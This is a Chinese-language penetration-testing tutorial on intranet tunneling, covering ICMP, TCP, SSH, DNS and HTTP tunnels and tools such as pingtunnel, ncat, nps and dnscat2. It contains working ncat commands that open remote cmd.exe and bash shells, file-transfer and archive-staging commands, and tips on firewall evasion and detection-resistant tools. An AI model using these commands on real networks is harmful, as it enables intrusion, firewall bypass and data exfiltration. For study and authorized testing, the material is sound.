# 内网穿透

## 内网穿透原理

内网穿透是:利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络。

什么是隧道技术呢？我们看一下百科词条的解释

隧道技术是一种通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递。被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道。一旦到达网络终点，数据将被解包并转发到最终目的地。注意隧道技术是指包括数据封装、传输和解包在内的全过程。

我们进行内网渗透常用的隧道技术有dns隧道、http隧道、ssh隧道、icmp隧道等容易被网络防火墙放行的协议。

## 这些隧道技术可以按所处的协议层分层

- 网络层隧道：IPV6隧道、ICMP隧道等
- 传输层隧道：TCP隧道、UDP隧道
- 应用层隧道：HTTP/S、DNS、SSH等隧道

## 判断内网的连通性

判断内网的连通性是指判断机器能否上外网等。要综合判断各种协议(TCP、HTTP、DNS、ICMP等)及其端口的通信情况，常见的允许流量流出的端口有80、8080、443、53、110、123等。

几个判断内网连通性的方法:

- ICMP协议
  - 执行命令"ping<IP地址或域名>"
- TCP协议
  - 使用netcat工具，执行命令"nc<IP地址 端口号>"
- HTTP协议
  - 使用curl工具，执行命令"curl<IP地址:端口号>"
- DNS协议
  - nslookup -h 查看命令帮助 Windows操作系统
  - dig -h 查看命令帮助 Linux操作系统

## 内网主机所有可能的出网方式

- 允许ICMP协议出网
  - 网络防火墙允许ICMP协议出网，即能ping通外网主机，一般都能出网
- 允许特定的TCP或UDP协议端口出网
  - 网络防火墙允许特定的TCP或者UDP端口出网，比如连接外网的22、53、80、443、3389等常见应用的默认监听端口。在一个不能出网的网络环境里面，将所有的TCP和UPD端口都探测一遍，通常都能发现有一两个常见的端口能出网。这通常是由于网络管理员的错误配置和偷懒行为导致。比如配置的防火墙规则前后矛盾，解析的时候遇到匹配规则就退出执行；比如网络管理员配置允许web服务器访问另一子网的mysql数据库的3306端口。网络管理员配置时偷懒，可能会直接放行web服务器到任意ip地址的3306端口
- 允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）
  - 这种网络防火墙能识别应用层的协议，放行允许出网的协议，比如HTTP、SSH、DNS、RDP等应用层协议;通常办公网是允许HTTP协议出网的，可能会域名白名单限制
- ipv6隧道，需要配置ipv6协议，常用的ipv6工具有(socat、6tunnel、nt6tunnel等)

容易出网的端口：
  SSH:TCP-22
  DNS:TCP-53、UTP53

## 内网主机所有可能的入网方式

1. 允许ICMP协议入网：能ping通目标主机
2. 允许特定的TCP或UDP协议端口入网：NAT端口映射公网IP端口到内网主机的服务端口，比如将web服务、mysql服务NAT映射到公网
3. 允许特定的应用层协议入网：这种网络防火墙能识别应用层的协议，放行允许入网的协议。比如HTTP反向代理，将公网收到的HTTP流量反向代理进内网主机。当前主流的入网方式，通常会加层WAF审查入网流量

### 内网穿透常用工具

#### 网络层隧道工具

- pingtunnel[工具地址](https://github.com/esrrhs/pingtunnel)：tcp、udp、socks5 over ICMP，速度快，连接稳定，跨平台，client模式不需要管理员权限即可正常使用，推荐使用

```l
server
sudo ./pingtunnel -type server

安装GUI客户端(新手推荐):https://github.com/esrrhs/pingtunnel-qt

安装客户端(高玩推荐)
转发sock5
pingtunnel.exe -type client -l :4455 -s www.yourserver.com -sock5 1

转发tcp
pingtunnel.exe -type client -l :4455 -s www.yourserver.com -t www.yourserver.com:4455 -tcp 1

转发udp
pingtunnel.exe -type client -l :4455 -s www.yourserver.com -t www.yourserver.com:4455
```

- ptunnel：kali中自带的

- icmpsh[工具地址](https://github.com/inquisb/icmpsh)：能通过ICMP协议反弹cmd，功能单一，反弹回来的cmd极不稳定，不推荐使用,icmpsh的目标主机只能运行于Windows平台，控制端只能运行于Linux平台

- icmptunnel[工具地址](https://github.com/DhavalKapil/icmptunnel)：创建虚拟网卡通过ICMP协议传输网卡流量，基于ICMP隧道的vpn，需要root权限，动静极大，不推荐使用
- 支持IPv6的隧道工具有socat、6tunnel、nt6tunnel等。
- 常用的ICMP隧道工具有icmpsh、PingTunel、icmptunel、powershell icmp等。

#### 传输层隧道工具

- ncat：nmap中的nc升级版

```l
linux|win 互连

win先监听，linux连win，在linux中执行命令（linux主动连接）
win:
ncat -c cmd.exe -v -lp 444
linux:
ncat -v  192.168.3.219 444

linux先监听，win连linux，在win中执行命令（win主动连接）
linux:
ncat -c bash -v -lp 444
win:
ncat -v  192.168.22.154 444

win先监听，linux连win，在win中执行命令（win被动连接）
win：
ncat -v -lp 444 --ssl
linux：
ncat -v -c bash 192.168.3.219 444 --ssl

linux先监听，win连linux，在linux中执行命令（linux被动连接）
linux：
ncat -v -lp 444
win：
ncat -v -c cmd.exe 192.168.22.154 444

文件传输

linux先传输，win后接收
linux:
ncat -v -lp 444 < 1.txt
win:
ncat -v  192.168.22.154 444 > 1.txt

win先传输，linux后接收
win:
ncat  -v -lp 444 <  2.txt
linux:
ncat -v 192.168.3.219 444 > 2.txt

win连接收，linux后传输
win:
ncat -v -lp 444 > 3.txt
linux:
ncat -v 192.168.3.219 444 < 2.txt

linux连接收，win后传输
linux:
ncat -v -lp 444 > 4.txt
win:
ncat -v  192.168.22.154 444 < 1.txt
```

- 其他工具

```l
netcat：网络工具中的瑞士军刀，不多介绍，linux系统一般自带

powercat：powershell版的netcat

socat：具有记录转发流的功能，方便查看转发内容，需要安装

netsh：windows系统自带的网络配置工具

lcx：端口转发工具

NATBypass：一款lcx在golang下的实现,更好的跨平台，更完善的文档

iox：端口转发 & 内网代理工具，功能类似于lcx/ew，简化了命令行参数，支持UDP流量转发，更好的跨平台。缺点：不支持监听指定IP，默认监听0.0.0.0:port，会增大暴露风险

Frp
ngrok

常见的HTTP/HTTPS代理工具有reGeorg、meterpreter、tunna等...
```

#### 应用层隧道工具

由于应用层协议极多，对应的隧道工具也很多，我们常用来做隧道的协议一般是DNS、HTTP、SSH、SOCKS等

- ssh

SSH 端口转发能够提供两大功能：

1. 加密 SSH Client 端至 SSH Server 端之间的通讯数据。
2. 突破防火墙的限制完成一些之前无法建立的 TCP 连接。

- 监听端的ssh配置：根据需求看着修改

```l
/etc/ssh/sshd_config
PermitRootLogin yes   # 是否允许root登陆
Port 22               # 监听端口
PasswordAuthentication yes  # 是否使用密码登陆
```

构建ssh隧道的常用参数:
-C 压缩传输，提高传输速度
-f 后台执行数据传输
-N 建立静默连接
-g 允许远程主机连接本地用于转发的端口
-L 本地端口转发
-R 远程端口转发
-D 动态转发，即SOCKS代理
-p 指定ssh连接端口
-X X协议，工具图形化

本地转发：远程服务器只需要开启ssh服务，等待本地连接，属于内网出网连接
>ssh -CNfg -L 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1

ssh客户端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由服务端转发到114.114.114.114:9999（如果不指定本地的ip：127.0.0.1，其他电脑就可以通过这个电脑的ip来访问）

远程转发：远程服务器连接，客户端监听，属于入网连接
>ssh -CNfg -R 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1

ssh服务端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh客户端，再由ssh客户端转发到114.114.114.114:9999

动态转发：
>ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1

ssh客户端监听127.0.0.1:7777开启socks服务，将收到的socks数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到目标地址

- nps[工具地址](https://github.com/ehang-io/nps/releases)——[使用文档](https://ehang-io.github.io/nps/#/?id=nps)：支持tcp、udp、socks5、http等几乎所有流量转发，可用来访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析、内网socks5代理等等……，并带有功能强大的web管理端。

```l
查看端口是否别占用:netstat -anp | grep 8080
server端搭建：
wget https://github.com/cnlh/nps/releases/download/最新版/linux_amd64_server.tar.gz
tar -zxvf linux_amd64_server.tar.gz -C ./nps
cd nps/
./nps install
./nps start
在安装完成，启动nps后，便可访问server_IP:8080来访问nps配置dashboard了
要求登陆，默认的用户名：admin，密码：123
网页dashboard的用户名和密码可在/etc/nps/conf/nps.conf配置文件中的web模块中修改

客户端：
下载客户端安装包并解压，进入到解压目录
点击web管理中客户端前的+号，复制启动命令
执行启动命令，linux直接执行即可，windows将./npc换成npc.exe用cmd执行
```

- 其他工具

```l
dnscat2：不仅可以创建DNS隧道，更是C2

dnscat2-powershell：dnscat2的powershell客户端

dns2tcp：TCP over DNS,即通过DNS隧道转发TCP连接

iodine：IPv4 over DNS，即通过DNS隧道转发IPv4数据包

reGeorg：SOCKS over HTTP,即通过HTTP隧道转发SOCKS

Neo-reGeorg：重构版reGeorg，提高稳定性和可用性，避免特征检测，更新活跃

reDuh：TCP over HTTP,即通过HTTP隧道转发TCP连接，隧道不稳定

Tunna：TCP、SOCKS over HTTP,即通过HTTP隧道转发TCP连接和SOCKS，隧道不稳定

ABPTTS：TCP over HTTP,即通过HTTP隧道转发TCP连接,数据加密，可自定义HTTP数据，对抗特征检测十分优秀，创建的隧道十分稳定，比较遗憾的是支持的web脚本类型只有aspx和jsp

EarthWorm：十分方便的多级SOCKS代理，已经永久停止更新

Termite：EarthWorm的升级版，已经永久停止更新

Venom：Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。

ssocks：正向和反向的socks工具，可执行文件的大小很小

s5.go：go语言编写的socks服务工具，良好的跨平台特性
```

## 总结

内网渗透中内网穿透的本质，无非是通过各种通信信道，无论是正向的还是反向的，实现传输层协议tcp/udp数据包的转发，应用层协议都是基于传输层的协议实现的。比如ABPTTS + SOCKS服务 = reGeorg

内网渗透中的内网穿透的条件，能通过某种通信信道远程代码执行。如果能通过某种通信信道远程代码执行，一定可以通过这种通信信道实现tcp/udp数据包的转发，即TCP/UDP over something隧道。如果没有现成的工具，可能需要我们自己开发。比如，通过sql注入获取了shell，我们也可以利用这条通信信道转发tcp/udp数据包，没有现成的工具，需要我们开发工具而已，隧道客户端将tcp/udp数据包封装写进数据库，再由隧道服务端从数据库中读出封装的数据包解包，发往对应地址即可。

## 压缩数据

RAR是一种专利文件格式，用于数据的压缩和打包，使用命令：

- Rar.exe a -k -r -s -m3 E:\webs\1.rar E:\webs 把E:\webs下的所有内容打包为1.rar，放到E:\webs目录下
- Rar.exe s E:\webs\1.rar 解压文件
- 以ZIP格式压缩/解压命令是一样的，只需要将文件后缀名修改为".zip"即可。

7-Zip是一款免费且开源的压缩软件，与其他软件相比，7-Zip有更高的压缩比；与WinRAR相比，7-Zip对系统资源的消耗较少，无需安装，功能与同类型的收费软件相近。使用命令：

- 7z.exe a -r -p12345 E:\webs\1.7z E:\webs\ 把E:\webs下的所有内容打包为1.7z，放到E:\webs\目录下，压缩密码为12345
- 7z.exe x -p12345 E:\webs\1.7z -oE:\x 把打包的1.7z文件解压到E:\x目录下

## 上传和下载

对于不能上传shell，但是可以执行命令的Windows服务器(而且唯一的入口就是命令行环境)，可以在shell命令环境中对目标服务器进行上传和下载操作。上传和下载方法:

- 使用FTP协议上传
- 使用VBS上传
- 利用Debug上传
- 利用Nishang上传
- 利用bitsadmin下载
- 使用PowerShell下载
